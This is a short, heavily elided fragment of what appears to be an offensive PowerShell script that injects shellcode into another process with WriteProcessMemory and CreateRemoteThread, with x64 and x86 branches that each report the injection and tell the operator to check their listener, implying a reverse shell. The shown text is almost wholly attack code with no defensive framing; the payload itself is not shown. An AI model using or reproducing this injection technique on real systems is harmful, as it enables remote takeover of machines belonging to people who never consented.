...
"@
    ...
    [Win32]::WriteProcessMemory($hProcess, $addr, $buf, $buf.Length, [IntPtr]::Zero)
    [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    Write-Host "[+] x64 shellcode injected! Check your listener."
}
else {
...
"@
    ...
    Write-Host "[+] x86 shellcode injected! Check your listener."
}
